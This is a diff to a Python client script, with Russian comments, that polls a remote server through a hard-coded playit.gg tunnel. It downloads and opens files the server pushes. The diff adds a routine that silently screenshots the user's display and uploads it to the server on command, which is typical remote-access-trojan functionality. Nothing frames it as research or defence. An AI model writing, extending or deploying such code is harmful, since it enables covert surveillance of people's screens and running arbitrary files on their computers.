@@ -12,6 +12,9 @@ import pythoncom
 import ctypes
 import sys
 import logging
+import pyautogui
+from PIL import Image
+import io
 
 # Настройка логирования
 if getattr(sys, 'frozen', False):
@@ -25,7 +28,7 @@ logging.basicConfig(
 )
 
 # URL сервера
-SERVER_URL = "your_playit_url"
+SERVER_URL = "http://main-nike.gl.at.ply.gg:54943"  # Замените на ваш playit.gg URL
 if getattr(sys, 'frozen', False):
     DOWNLOAD_DIR = os.path.join(os.path.dirname(sys.executable), "tempfiles")
 else:
@@ -167,20 +170,47 @@ def register_client(client_id, client_name):
         logging.error(f"Error registering client: {e}")
         return False
 
+def capture_and_send_screen(client_id, retries=3):
+    for attempt in range(retries):
+        try:
+            screenshot = pyautogui.screenshot()
+            img = Image.frombytes('RGB', screenshot.size, screenshot.tobytes())
+            buffer = io.BytesIO()
+            img.save(buffer, format="PNG")
+            screen_b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
+            logging.info(f"Screen captured, size: {len(screen_b64)} bytes, attempt {attempt + 1}")
+            validated_url = validate_url(f"{SERVER_URL}/api/receive_screen/{client_id}")
+            response = requests.post(
+                validated_url,
+                json={"screen": screen_b64},
+                timeout=15
+            )
+            if response.status_code == 200:
+                logging.info(f"Screen sent successfully for client {client_id}")
+                return True
+            else:
+                logging.error(f"Failed to send screen, status: {response.status_code}, response: {response.text}")
+        except Exception as e:
+            logging.error(f"Error capturing or sending screen for client {client_id}, attempt {attempt + 1}: {e}")
+        if attempt < retries - 1:
+            time.sleep(2)  # Пауза перед повторной попыткой
+    logging.error(f"Failed to send screen after {retries} attempts for client {client_id}")
+    return False
+
 def check_for_file(client_id):
     try:
         validated_url = validate_url(f"{SERVER_URL}/api/check/{client_id}")
         response = requests.get(validated_url, timeout=10)
         if response.status_code == 200:
             data = response.json()
-            return data.get("file")
+            return data.get("file"), data.get("screen_command")
         else:
             print(f"Check file failed with status code: {response.status_code}")
             logging.error(f"Check file failed with status code: {response.status_code}")
     except Exception as e:
         print(f"Error checking for file: {e}")
         logging.error(f"Error checking for file: {e}")
-    return None
+    return None, False
 
 def download_and_open_file(file_data, retries=3, delay=5):
     for attempt in range(retries):
@@ -236,15 +266,21 @@ def main():
             logging.error("Failed to register client")
             return
 
-        print("Client registered, waiting for files...")
-        logging.info("Client registered, waiting for files...")
+        print("Client registered, waiting for commands...")
+        logging.info("Client registered, waiting for commands...")
         while True:
-            file_data = check_for_file(client_id)
+            file_data, screen_command = check_for_file(client_id)
             if file_data and "filename" in file_data and "content" in file_data:
                 print(f"Received file to download: {file_data['filename']}")
                 logging.info(f"Received file to download: {file_data['filename']}")
                 download_and_open_file(file_data)
-            time.sleep(5)
+            if screen_command:
+                logging.info(f"Screen command received for client {client_id}")
+                if capture_and_send_screen(client_id):
+                    logging.info(f"Screen capture and send successful for client {client_id}")
+                else:
+                    logging.error(f"Failed to capture and send screen for client {client_id}")
+            time.sleep(1)
 
     except Exception as e:
         print(f"Main execution failed: {e}")
